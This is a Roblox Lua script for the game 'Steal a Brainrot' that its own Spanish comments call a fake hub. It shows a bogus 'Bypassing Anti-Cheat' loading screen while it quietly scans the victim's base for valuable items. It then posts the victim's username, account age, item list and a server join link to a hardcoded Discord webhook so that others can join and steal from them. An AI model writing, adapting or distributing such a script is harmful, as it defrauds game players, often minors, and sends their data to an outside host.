-- [[ CacaoDev Fake Hub - Steal a Brainrot Edition ]]
-- El script que todos los pendejos van a querer usar.

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- 1. CONFIGURA TU WEBHOOK AQUÍ, CABRÓN
local WebhookURL = "https://discord.com/api/webhooks/1488017742165573812/JAj3XSpot3xrAxRWtD9XcJb7cnDaFQb5Xs9O9ha0lSHtJ5eaovFs0GW47AhcCM6OePg6" 

-- 2. BASE DE DATOS DE BRAINROTS (Para que el hit se vea pro)
local brainrotDB = {
    ["La grande combinasione"] = "10m/s $1b", ["Los 25"] = "10m/s $1.5b", ["Tacorillo crocodillo"] = "12.5m/s $1.5b",
    ["Mariachi corazoni"] = "12.5m/s $1.7b", ["Swag soda"] = "13m/s $1.8b", ["Noo my heart"] = "13m/s $1.8b",
    ["Chimnino"] = "14m/s $1.9b", ["Los combinasionas"] = "15m/s $2b", ["Chicleteira noelteira"] = "15m/s $2b",
    ["Nuclearo dinosauro"] = "15m/s $2.5b", ["Easterino bicicleteira"] = "15.5m/s $2.2b", ["Tacorita bicicleta"] = "16.5m/s $2.2b",
    ["Los sweethearts"] = "16.5m/s $2.2b", ["Spinny hammy"] = "17m/s $2.3b", ["Dj panda"] = "17.5m/s $2.5b",
    ["Chicleteira cupideira"] = "17.5m $2.5b", ["Las sis"] = "17.5m/s $2.5b", ["Los planitos"] = "18.5m/s $2.7b",
    ["Los hotspotsitos"] = "20m/s $3b", ["Los jolly combinasionas"] = "20m/s $3b", ["Cigno Fulgoro"] = "20m/s $3b",
    ["Money money puggy"] = "21m/s $2.6b", ["Los mobilis"] = "22m/s $2.7b", ["Celularsini viciosini"] = "22.5m/s $2.7b",
    ["Los 67"] = "22.5m/s $2.7b", ["Los candies"] = "23m/s $3b", ["Choco choco cat"] = "23m/s $3b",
    ["La extinct grande"] = "23.5m/s $3.2b", ["Los bros"] = "24m/s $3b", ["Bacuru and egguru"] = "24m/s $3.8b",
    ["La spooky grande"] = "24.5m/s $2.9b", ["Money money reindeer"] = "25m/s $2.5b", ["Chillin chill"] = "25m/s $2.5b",
    ["Tuff toucan"] = "26m/s $2.7b", ["Mieteteira bicicleteira"] = "26m/s $2.7b", ["Gobblino uniciclino"] = "27.5m/s $2.8b",
    ["Tralaledon"] = "27.5m/s $3b", ["W or l"] = "30m/s $3b", ["Los puggies"] = "30m/s $3b",
    ["Esok sekolah"] = "30m/s $3.5b", ["Los cupids"] = "30m/s $3.5b", ["La taco combinasion"] = "35m/s $5b",
    ["Ketupat kepat"] = "35m/s $5b", ["Swaggy bros"] = "40m/s $7b", ["Orcaledon"] = "40m/s 7b",
    ["Antonio"] = "55m/s $12.5b", ["Spaghetti tualetti"] = "60m/s $1b", ["Bunni and eggi"] = "60m/s $13b",
    ["Festive 67"] = "67m/s $16b", ["Los spaghettis"] = "70m/s $20b", ["La ginger sekolah"] = "75m/s $23b",
    ["La food combinasion"] = "90m/s $30b", ["La casa boo"] = "100m/s $40b", ["Los sekolahs"] = "110m/s $45b",
    ["La secret combination"] = "125m/s $50b", ["Cooki and milki"] = "155m/s $100b", ["Capitano moby"] = "160m/s $125b",
    ["Dragon cannelloni"] = "250m/s $250b", ["Skibidi toilet"] = "450m/s $450b", ["John pork"] = "850m/s $850b"
}

-- 3. INTERFAZ FALSA (Para que el pendejo se quede viendo la pantalla)
local sg = Instance.new("ScreenGui", player.PlayerGui)
local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(0, 320, 0, 120)
frame.Position = UDim2.new(0.5, -160, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BorderSizePixel = 0

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "CacaoDev Hub V2"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.Code
title.TextSize = 20
title.BackgroundTransparency = 1

local status = Instance.new("TextLabel", frame)
status.Size = UDim2.new(1, 0, 0, 30)
status.Position = UDim2.new(0, 0, 0.4, 0)
status.Text = "Bypassing Anti-Cheat..."
status.TextColor3 = Color3.fromRGB(0, 200, 255)
status.Font = Enum.Font.SourceSans
status.BackgroundTransparency = 1

local barBg = Instance.new("Frame", frame)
barBg.Size = UDim2.new(0.9, 0, 0, 4)
barBg.Position = UDim2.new(0.05, 0, 0.8, 0)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 120)

-- 4. EL ROBO SILENCIOSO
task.spawn(function()
    -- Animación de carga falsa
    TweenService:Create(bar, TweenInfo.new(6), {Size = UDim2.new(1, 0, 1, 0)}):Play()
    
    task.wait(1)
    status.Text = "Scanning Tycoon Objects..."
    
    -- Jalar el link y escanear items
    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
    
    local found = ""
    local tycoon = workspace:FindFirstChild("Tycoons") and workspace.Tycoons:FindFirstChild(player.Name)
    local items = tycoon and tycoon:FindFirstChild("PurchasedObjects")
    
    if items then
        for name, potential in pairs(brainrotDB) do
            if items:FindFirstChild(name) then
                found = found .. "💎 **" .. name .. "**: " .. potential .. "\n"
            end
        end
    end

    -- Mandar el reporte a Discord
    local data = {
        ["content"] = "@everyone **¡CACAODEV HIT!** 🎯",
        ["embeds"] = {{
            ["title"] = "CacaoDev • SAB Hit [:cacao:]",
            ["description"] = "Se ha detectado una base valiosa.",
            ["color"] = 3447003,
            ["fields"] = {
                {["name"] = "👤 Víctima", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "📅 Edad", ["value"] = player.AccountAge .. " días", ["inline"] = true},
                {["name"] = "👑 Brainrots Detectados", ["value"] = (found == "" and "No se encontraron secrets." or found)},
                {["name"] = "🔗 Join Link", ["value"] = "[Pícale aquí para entrar](" .. joinLink .. ")"}
            },
            ["footer"] = {["text"] = "CacaoDev Services • Executing King"}
        }}
    }

    pcall(function()
        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data))
    end)

    task.wait(2)
    status.Text = "Injecting Farm Modules..."
    task.wait(3)
    status.Text = "✅ SUCCESS! Hub Loaded."
    task.wait(1.5)
    sg:Destroy() -- Se quita la pantalla y el pendejo cree que ya cargó
end)
